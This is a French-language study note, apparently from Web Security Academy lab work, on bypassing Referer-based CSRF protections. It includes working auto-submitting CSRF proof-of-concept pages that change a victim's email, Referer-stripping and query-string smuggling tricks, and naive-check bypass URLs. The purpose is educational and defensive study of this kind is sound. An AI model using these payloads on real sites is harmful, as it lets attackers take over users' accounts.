> Contournement des défenses CSRF basées sur les référents

Outre les défenses utilisant des jetons CSRF, certaines applications utilisent l'en-tête HTTP `Referer` pour tenter de se défendre contre les attaques CSRF, généralement en vérifiant que la requête provient bien de leur propre domaine. Cette approche est généralement moins efficace et souvent contournée.

Referer = d’où vient la requête

## Validation of Referer depends on header being present

(La validation du référent dépend de la présence de l'en-tête | CSRF où la validation du référent dépend de la présence de l'en-tête )

Certaines applications valident l'en-tête `Referer` lorsqu'il est présent dans les requêtes, mais ignorent la validation si l'en-tête est omis.

> Dans ce cas, un attaquant peut concevoir son exploit CSRF de manière à ce que le navigateur de la victime **supprime l' en-tête `Referer` de la requête résultante**. Il existe plusieurs méthodes pour y parvenir, la plus simple étant d'utiliser une balise META dans la page HTML hébergeant l'attaque CSRF

```html
<html>
<head>
    <meta name="referrer" content="never">
</head>
  <body>
    <form action="https://0ae200a604a4d48ea6eb371300a100ff.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Validation of Referer can be circumvented

(La validation du référent peut être contournée)

Certaines applications font une vérification naïve du header `Referer`. Par exemple, si elles testent seulement que l’URL du `Referer` **commence** par `vulnerable-website.com`, un attaquant peut créer une URL suivante pour tromper la vérification:

```
http://vulnerable-website.com.attacker-website.com/...
```

De même, si l’application se contente de vérifier que la chaîne `vulnerable-website.com` **est contenue** quelque part dans le `Referer`, l’attaquant peut la cacher dans les paramètres comme suite et passer la validation.

```
http://attacker-website.com/... ?vulnerable-website.com
```

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="iamhunter404&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?web-security-academy.net/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

```
POST /my-account/change-email HTTP/1.1
Referer: https://attacker.example/?web-security-academy.net/
email=iamhunter404%40gmail%2Ecom
```

De nombreux navigateurs suppriment désormais par défaut la chaîne de requête de l'en-tête de référent par mesure de sécurité. Pour contourner ce comportement et garantir que l'URL complète est incluse dans la requête ajouter ceci

```http
Referrer-Policy: unsafe-url
```
